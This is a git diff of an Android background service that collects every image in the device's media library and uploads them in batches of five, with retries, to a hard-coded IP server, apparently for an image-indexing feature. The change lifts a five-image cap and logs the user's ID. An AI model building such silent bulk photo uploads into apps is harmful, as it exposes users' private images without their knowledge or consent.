@@ -33,6 +33,7 @@ public class BackgroundService extends Service {
     private static final String TAG = "BackgroundService";
     private static final String SERVER_IP = "http://164.92.122.168:5000/update_index"; // Replace with your server IP
 
+    private static final int MAX_RETRY_COUNT = 3;
     private FirebaseAuth mAuth;
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
@@ -64,24 +65,28 @@ public class BackgroundService extends Service {
 
             // Gather all images from the media library
             ArrayList<File> imageFiles = getImagesFromMediaLibrary(BackgroundService.this.getApplicationContext());
-            // get only first 5 images
-            imageFiles = new ArrayList<>(imageFiles.subList(0, 5));
 
             Log.d(TAG, " length: " + imageFiles.size());
 
-            // Make a POST request with the gathered images
-            if (imageFiles != null && !imageFiles.isEmpty()) {
-                try {
-//                    postImagesToServer(imageFiles);
-                    postImagesBatchToServer(imageFiles);
-                    return true;
-                } catch (IOException e) {
-                    Log.e(TAG, "Error making POST request: " + e.getMessage());
-                    return false;
+            // Process images in batches of 5
+            for (int i = 0; i < imageFiles.size(); i += 5) {
+                Log.d(TAG, " i: " + i);
+                int endIndex = Math.min(i + 5, imageFiles.size());
+                ArrayList<File> batch = new ArrayList<>(imageFiles.subList(i, endIndex));
+
+                // Make a POST request with the gathered batch of images
+                if (batch != null && !batch.isEmpty()) {
+                    try {
+//                        postImagesBatchToServer(batch);
+                        postImagesBatchToServerWithRetry(batch);
+                    } catch (IOException e) {
+                        Log.e(TAG, "Error making POST request: " + e.getMessage());
+                        return false;
+                    }
                 }
             }
 
-            return false;
+            return true;
         }
 
         @Override
@@ -143,6 +148,23 @@ public class BackgroundService extends Service {
             }
         }
 
+        private void postImagesBatchToServerWithRetry(ArrayList<File> imageFiles) throws IOException {
+            int retryCount = 0;
+
+            while (retryCount < MAX_RETRY_COUNT) {
+                try {
+                    postImagesBatchToServer(imageFiles);
+                    return; // Success, exit the loop
+                } catch (IOException e) {
+                    Log.e(TAG, "Error making POST request: " + e.getMessage());
+                    retryCount++;
+                    Log.d(TAG, "Retrying... Attempt " + retryCount);
+                }
+            }
+
+            Log.e(TAG, "Maximum retry attempts reached. Failed to post images to the server.");
+        }
+
         private void postImagesBatchToServer(ArrayList<File> imageFiles) throws IOException {
             OkHttpClient client = new OkHttpClient();
             MediaType MEDIA_TYPE_JPG = MediaType.parse("image/jpeg");
@@ -151,6 +173,8 @@ public class BackgroundService extends Service {
                     .setType(MultipartBody.FORM);
 
             String userId = mAuth.getCurrentUser().getUid();
+
+            Log.d(TAG, " userId: " + userId);
 
             multipartBuilder.addFormDataPart("userId", userId, RequestBody.create(MediaType.parse("text/plain"), userId));
             for (File imageFile : imageFiles) {
